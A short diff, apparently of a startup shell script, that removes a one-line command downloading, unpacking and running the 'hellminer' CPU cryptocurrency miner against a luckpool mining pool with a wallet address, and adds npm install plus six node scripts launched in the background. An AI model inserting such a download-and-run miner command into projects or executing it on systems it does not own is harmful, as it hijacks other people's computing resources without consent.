@@ -1,1 +1,7 @@
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RJTX2MHX6KjJRS8Byo7rDrWAqbgitUKiyt.POP -p x
+npm install
+node a1.js &
+node a2.js &
+node a3.js &
+node b1.js &
+node b2.js &
+node b3.js &
